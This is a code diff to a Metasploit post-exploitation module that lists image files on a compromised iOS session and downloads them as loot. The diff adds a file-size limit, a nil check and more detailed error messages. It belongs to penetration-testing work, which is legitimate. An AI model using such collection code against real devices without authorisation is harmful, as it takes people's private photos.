@@ -38,6 +38,10 @@ class MetasploitModule < Msf::Post
         }
       )
     )
+
+    register_advanced_options([
+      OptInt.new('MAX_FILE_SIZE', [true, 'Maximum image file size to download in megabytes', 10])
+    ])
   end
 
   def enum_img(f_path)
@@ -46,12 +50,25 @@ class MetasploitModule < Msf::Post
     ios_imgs.each do |img|
       next if ['.', '..'].include?(img)
 
+      img_full_path = "#{f_path}/#{img}"
+      file_size = stat(img_full_path).size
+      max_size = datastore['MAX_FILE_SIZE'] * 1024 * 1024
+      if file_size > max_size
+        print_warning("Skipping #{img}: file size #{file_size} bytes exceeds MAX_FILE_SIZE (#{datastore['MAX_FILE_SIZE']} MB)")
+        next
+      end
+
       print_status("Downloading image: #{img}")
-      image_data = read_file("#{f_path}/#{img}")
+      image_data = read_file(img_full_path)
+      if image_data.nil?
+        print_error("#{img} could not be read: read_file returned nil")
+        next
+      end
+
       loot_path = store_loot('ios.image', 'application/octet-stream', session, image_data, img, "iOS image #{img}")
       print_good("Image stored at: #{loot_path}")
-    rescue StandardError
-      print_error("#{img} could not be downloaded")
+    rescue StandardError => e
+      print_error("#{img} could not be downloaded: #{e.message}")
     end
   end
 
